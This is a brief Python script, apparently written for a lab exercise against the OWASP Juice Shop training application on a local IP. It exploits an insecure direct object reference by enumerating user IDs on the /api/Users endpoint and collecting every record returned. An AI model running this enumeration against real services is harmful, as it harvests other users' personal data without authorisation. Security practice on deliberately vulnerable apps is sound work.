import requests

# Reusable IDOR enumeration script for JuiceShop
# Target: /api/Users/:id

def enumerate_users(base_url, max_id=20):
    results = {}
    for i in range(1, max_id + 1):
        url = f"{base_url}/api/Users/{i}"
        response = requests.get(url)
        if response.status_code == 200:
            results[i] = response.json()
    return results

if __name__ == '__main__':
    print(enumerate_users('http://192.168.2.69:3000'))